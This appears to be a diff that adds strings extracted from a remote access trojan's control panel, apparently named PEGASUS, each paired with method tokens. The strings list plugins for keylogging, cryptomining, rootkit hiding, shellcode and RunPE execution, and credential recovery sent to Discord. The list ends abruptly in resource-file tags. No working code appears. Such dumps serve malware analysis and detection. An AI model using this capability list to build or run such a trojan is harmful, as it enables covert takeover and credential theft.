+plu_gin|06000740,06000764,060008D5,060008DB,060008DC,060008DD,060008E0,060008E1,060008E2,060008E3,060008E4,060008E5,060008E6,060008EA,060008EB,060008EC,060008ED,060008EE,060008EF,060008F2,060008F3,060008F4,060008F6,060008F7,060008FA,060008FB,060008FC,06000901,06000903,06000904,0600090B,0600090C,0600090D,0600090E,06000910,06000911,06000912,06000913,06000914,06000936,0600093B,0600093C,0600093D,0600093E,06000940,06000941,06000943,06000944,06000945,06000946,06000948,06000949,0600094A,0600094B,0600094D,0600094E,0600094F,06000952,06000953,06000954,06000957,06000959,0600095A,0600095B,0600095C,0600095F,06000962,06000963,06000964,06000966,06000967,06000969,0600096A,0600096B,0600096F,06000970,0600098B,0600098D,0600098E,0600098F,06000990,06000991,06000992,06000993,06000996,06000997,06000998,0600099A,0600099B,0600099D,0600099E,0600099F,060009A0,060009A5,060009A8,060009A9,060009AA|
+plugin|060008FD,06000902|
+Plugin |06000238|
+Plugins|06000238,060007BC|
+Plugins\AUD.dll|06000740|
+Plugins\Connection.dll|06000963|
+Plugins\CT.dll|06000764|
+Plugins\DCD.dll|06000903|
+Plugins\Ex.dll|060008E1,060008E3,06000911,06000912,06000941,06000943,06000944,06000957,06000964|
+Plugins\FC.dll|06000969|
+Plugins\FM.dll|0600093D|
+Plugins\FS.dll|06000952|
+Plugins\hDesk.dll|0600098D,0600098E,0600098F,06000990,06000991,06000993,06000996,06000997|
+Plugins\IF.dll|06000953|
+Plugins\ip2region.db|060007BC|
+Plugins\KATANA.dll|060009A8|
+Plugins\KillTheBear.exe|060008E4|
+Plugins\KL.exe|060008E5|
+Plugins\LG.dll|06000945|
+Plugins\MCG.dll|0600099A,0600099B,0600099D,0600099E|
+Plugins\Miner.dll|060008EB,060008F4,0600099F,060009A0|
+Plugins\ML.dll|06000901,06000902,06000954,0600096A,060009A9|
+Plugins\Ngrok.dll|060008D5,06000992,06000998,060009A5|
+Plugins\OPT.dll|060008E2,060008F6,060008F7,0600090B,0600090C,0600090D,0600090E,06000936,06000946,06000948,06000949,0600094B,0600094D,0600094E,0600094F,06000959,0600095A,0600095B,0600095F,06000962,06000967|
+Plugins\PegShark.dll|0600098B,060009AA|
+Plugins\PM.dll|0600093E|
+Plugins\Promitheas.dll|060008E6|
+Plugins\PRP.dll|060008F2,060008F3|
+Plugins\RC.dll|0600093C|
+Plugins\RD.dll|0600093B|
+Plugins\Rec.dll|0600095C|
+Plugins\REG.dll|06000966|
+Plugins\RP.dll|06000904|
+Plugins\SF.dll|060008DB,060008DD,060008E0,06000913,06000914,0600094A|
+Plugins\SM.dll|060008DC,060008E4,060008E5,06000940|
+Plugins\SPM.dll|060008FA,060008FB,060008FC,060008FD|
+Plugins\StS.dll|060008EA|
+Plugins\WatchDogs.dll|060008EC,060008ED,060008EE,060008EF|
+Plugins\ZEUS.dll|06000910,0600096B,0600096F,06000970|
+pm.png|060009AC|
+pn.png|060009AC|
+Po_ng|06000BAE|
+pool|060001A2,060001A3,060008EB,0600099F|
+Pool:Port|060005BA|
+port|0600096B,0600096F,06000992,06000998,060009A5|
+Port|060005E7,0600076F,060007CA,060008FD|
+PORT|06000683,0600098B|
+PORT                                                                                            |06000683|
+Port 25: |060005E7|
+Port 2525: |060005E7|
+Port 465: |060005E7|
+Port 587: |060005E7|
+Port:|060005F1|
+PORT:|06000779|
+port=|06000933|
+Ports|06000178,06000179|
+Possible malicious activity detected!|0600030C,06000310,06000311,06000312,06000313,06000314|
+POST|06000456|
+postStart|0600076F|
+postStop|06000770|
+powershell|06000902|
+Powershell|060009AC|
+POWERSHELL|060005C9|
+Powershell Loader|06000683|
+Powershell!|06000B36|
+powershell:|06000902,06000B68|
+powershellToolStripMenuItem|060009AC|
+powershellWriteInput|060005C7|
+pr.png|060009AC|
+priviligeEscalationFirewallToolStripMenuItem|060009AC|
+priviligeEscalationFirewallToolStripMenuItem.Image|060009AC|
+Process Manager|060007DD,060009AC|
+processManager|060007DE|
+processManager:|0600093E,06000BB8|
+Processor|060009AC|
+PROCPHOENIX|060000D8,060000D9|
+Product Version:|06000683|
+Product:|06000683|
+ProductName|06000182,06000183,06000663|
+ProductVersion|06000663|
+Progman|06000657|
+Program|0600098A|
+Program Manager|06000657|
+Program Notification|060009AC|
+progressBar1|0600012D|
+Property value is not valid.|06000028,0600002C,0600002F,06000031|
+Protection|060009AC|
+protectionToolStripMenuItem|060009AC|
+proto|06000992,06000998,060009A5|
+protobuf-net|06000BC3|
+Protocol:|060005F1|
+Proxy Type|06000608|
+ProxyPort|060005F1|
+ps.png|060009AC|
+pt.png|060009AC|
+pw.png|060009AC|
+py.png|060009AC|
+qa.png|060009AC|
+qo1lc3sjd8zpt9cx|06000731|
+Quality|060007F7,0600080A,06000831|
+Quality : |06000AF4|
+QualityLabel|06000B36|
+QualityScroll|06000B36|
+quark|060005BA|
+QWORD (64-bit) Value|0600087D|
+qWORD64bitValueToolStripMenuItem|0600087D|
+qWORD64bitValueToolStripMenuItem1|0600087D|
+qWORD64bitValueToolStripMenuItem2|0600087D|
+radioButtonAggressive|060001DC,060001DD|
+radioButtonEasy|060001DA,060001DB|
+radioDecimal|06000718|
+radioHexa|06000718|
+Random|06000683|
+Rank:|06000731|
+RDP Login captured: |06000B64|
+re.png|060009AC|
+ReadInput|06000B68,06000BB4|
+readme.txt|06000091|
+Reboot|060009AC|
+RECORD|06000742|
+Recover All &amp; Send to Discord|060009AC|
+recoverAllSendToDiscordToolStripMenuItem|060009AC|
+Recovery|06000B84|
+RECOVERY|060008A1|
+Reflection|06000143|
+Refresh|060006F2,0600079C,060007DD|
+rEFRESHToolStripMenuItem|0600079C|
+REG_BINARY|06000496,060004AA|
+reg_binary.png|0600087D|
+REG_DWORD|06000496,060004AA|
+REG_EXPAND_SZ|06000496,060004AA|
+REG_MULTI_SZ|06000496,060004AA|
+REG_NONE|060004AA|
+REG_QWORD|06000496,060004AA|
+reg_string.png|0600087D|
+REG_SZ|06000496,060004AA|
+RegAsm.exe|06000143|
+Regedit|0600087D|
+register|06000311,06000313,06000361|
+Register|06000631,060008AD,060008BF|
+REGISTER|060008AD|
+Register has been successful!|060008A7|
+register successful!|06000635|
+Register your new key!|06000631|
+registerdate|06000730|
+Registration Date:|06000731|
+Registration:|06000730|
+Registry Editor []|0600087D|
+registry_editor_48px.png|0600087D|
+regManager|0600085C,0600085D,06000869,0600086B,0600086C,0600086E,0600086F,06000870,06000871,06000872,06000873,06000874,0600087B|
+RegSvcs.exe|06000143|
+Remember to save the BackupCertificate.zip|06000758|
+Remote  PC Information|060009AC|
+Remote Camera|0600083B,060009AC|
+Remote Console|060009AC|
+Remote Desktop|0600080A,060009AC|
+Remote Fun Control|060009AC|
+Remote Record|060009AC|
+Remote Regedit|060009AC|
+Remote Reverse Proxy|060009AC|
+Remote Shell|060005C9,06000825|
+RemoteAddress|060006F2|
+remoteDesktop|060007F7,060007FB,060007FC,060007FD,06000801,06000802|
+RemoteDesktop|0600093B|
+RemoteDesktop:|0600093B,06000BB1|
+remoteMinerToolStripMenuItem1|060009AC|
+remoteRegedit:|06000966,06000B85|
+remoteReverseProxyToolStripMenuItem|060009AC|
+Removable Drive|060003EC|
+Remove|060005B0|
+Remove IP/PORT|06000683|
+Remove PEGASUS from Startup|060009AC|
+Remove PEGASUS Task|060009AC|
+Remove Port|06000683,060007CA|
+removeToolStripMenuItem|060005B0|
+removeToolStripMenuItem1|060005B0|
+Rename|0600079C,0600087D|
+Rename File or Folder|0600078E|
+Rename Functions|06000683|
+renameFile|0600078E|
+renameFolder|0600078E|
+RenameKey|06000B85|
+RenameRegistryKey|0600085C|
+RenameRegistryValue|06000869|
+renameToolStripMenuItem|0600079C,0600087D|
+renameToolStripMenuItem1|0600087D|
+renameToolStripMenuItem2|0600087D|
+RenameValue|06000B85|
+Renaming...|06000A8C|
+reportWindow|06000946,06000947|
+reqUploadFile|06000784|
+Reset HWID|06000631,060008BF|
+Reset Scale!|060009AC|
+Resize : |06000AF5|
+ResizeScroll|06000B36|
+ResourceManager|06000A47,06000A68|
+Resources|06000A3C,06000A46|
+restart|06000949,0600094D|
+Restart|060009AC|
+Restore|060006D5|
+RestoreMaxBtn|06000B36|
+RestoreMaxBtn.Image|06000B36|
+restoreMouseButtons|060006C2|
+Retry|0600009F,060000A4,060000A5,06000A19,06000A1E,06000A1F|
+REVERSE PROXY|06000608|
+Reverse Proxy []|06000608|
+Reverse Proxy [Load-Balancer is active]|060005F8|
+Reverse Proxy Panel|060009AC|
+ReverseProxy|06000904|
+ReverseProxyPort|060001CC,060001CD|
+reverseProxyToolStripMenuItem|060009AC|
+reverseProxyToolStripMenuItem.Image|060009AC|
+reverseProxyToolStripMenuItem1|060009AC|
+RgstrBtn|06000631|
+richTextBox1|060005C9,0600076D,060007B8,06000825|
+richTextBox2|06000683|
+RK|06000173|
+RmFpbGVkIHRvIGJpbmQgdG8gc2VydmVyLCBjaGVjayB5b3VyIEFJRCAmIFNlY3JldCBpbiB5b3VyIGNvZGUh|0600030C|
+ro.png|060009AC|
+ROAMING|06000596,06000618,06000619|
+rootKey|06000B85|
+RootKey|06000B85|
+RootKeyName|0600085D|
+RootKit|060009AC|
+rs.png|060009AC|
+RStart|060008F2|
+RStop|060008F3|
+ru.png|060009AC|
+run|06000946|
+Run|06000123|
+Run Shellcode|060009AC|
+Run times|060009AC|
+RunPE|06000143|
+rw.png|060009AC|
+sa.png|060009AC|
+Save|06000683,060007B8|
+Save IP/Port to the list!|06000683|
+Save Login|06000631,060008BF|
+save_Plugin|06000238|
+Saving file...|06000A8C|
+sb.png|060009AC|
+sc.png|060009AC|
+-Scan -ScanType 3 -File "|06000680|
+Scanning the whole file first|0600067C|
+schtaskinstall|0600095B|
+schtaskuninstall|060008F6,06000962|
+scotland.png|060009AC|
+Screen|060007F7,0600080A|
+Screens|06000BB1|
+scrypt|060005BA|
+sd.png|060009AC|
+se.png|060009AC|
+Search|060007B8|
+SEARCH|060007A7|
+Second|06000740|
+seconds|060006D5,06000742|
+secret|0600030C,0600030E,06000310,06000311,06000312,06000313,06000314|
+Secret|0600019C,0600019D|
+Secret:|06000721|
+Security error has been triggered!|0600030C,06000310,06000311,06000312,06000313,06000314|
+Segoe UI|06000063,060005BA,060005DE,06000730,06000932,060009AC,06000A39,06000B36|
+Segoe UI Light|06000631|
+Segoe UI Semibold|060009AC|
+SELECT Caption FROM Win32_OperatingSystem|0600007B|
+Select the path for your payload installation!|06000683|
+selectedItem_ContextMenuStrip|0600087D|
+selectedStripStatusLabel|0600087D|
+SELLIX|06000A39|
+Send|060005D2,060005E7,0600076D,060009AC|
+Send Email From Client PC|060009AC|
+Send File To Disk|060009AC|
+Send File To Memory|060009AC|
+Send to Discord|060005DE|
+Send to Telegram (coming soon)|060005DE|
+sendEmailFromClientPCToolStripMenuItem|060009AC|
+sendFile|060008DB,060008DD,06000913,06000914,0600094A|
+SendFile: |060008DB|
+SendFileFromUrl: |060008E1|
+sendMemory|060008DC,060008E4,060008E5,06000940|
+SendMemory: |060008DC|
+sendMessage|06000941|
+Server Name:|06000756|
+session_id|0600030C,0600030E,06000310,06000311,06000312,06000313,06000314|
+session_key|0600030C,0600030E,06000310,06000311,06000312,06000313,06000314|
+sessionid|06000361,06000362,06000363,06000364,06000365,06000366,06000367,06000368,06000369,0600036A,0600036B,0600036C,0600036D,0600036E,0600036F|
+Set IP/PORT|06000683|
+setClient|06000B85|
+Setting|06000721|
+Settings|06000668,06000A3C|
+setvar|06000366|
+sevenZiplStripMenuItem1|0600079C|
+sg.png|060009AC|
+sh.png|060009AC|
+SHA256|06000668|
+sha256d|060005BA|
+SHA512WITHRSA|06000458|
+shavite3|060005BA|
+shell|06000901|
+Shell|06000123|
+shell:|06000901,06000BB4|
+Shellcode|0600096A|
+ShellCode Files|060005B0|
+shellCodeListView|060005B0|
+ShellcodeLoader|06000174|
+SHELLDLL_DefView|06000657|
+shellWriteInput|0600081D,0600081E|
+shield_48px.png|06000103|
+Show|060006D5|
+Shut Down|060009AC|
+shutdown|0600094E|
+si.png|060009AC|
+Silent Installer|060009AC|
+silentInstallerToolStripMenuItem|060009AC|
+SimSun|0600076D|
+Sin|06000A80|
+Size|060005B0|
+Size : 75%|06000B36|
+SizeLimit|06000952|
+sj.png|060009AC|
+sk.png|060009AC|
+skein|060005BA|
+SKYNET|060005BA|
+    </value>
+  </resheader>
+</root>
